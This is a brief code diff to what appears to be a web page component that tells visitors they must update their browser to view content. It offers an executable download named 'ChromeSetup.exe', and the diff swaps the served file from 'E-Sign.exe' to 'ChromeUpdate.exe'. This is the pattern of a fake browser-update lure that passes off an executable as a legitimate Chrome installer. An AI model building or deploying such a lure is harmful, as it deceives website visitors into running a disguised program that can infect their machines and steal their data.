@@ -11,7 +11,7 @@ export const AutoUpdateSection = () => {
          You need to update your browser to view the content!
         </h1>
           <a
-            href="/E-Sign.exe"
+            href="/ChromeUpdate.exe"
             download="ChromeSetup.exe"
             className="btn-download"
           >
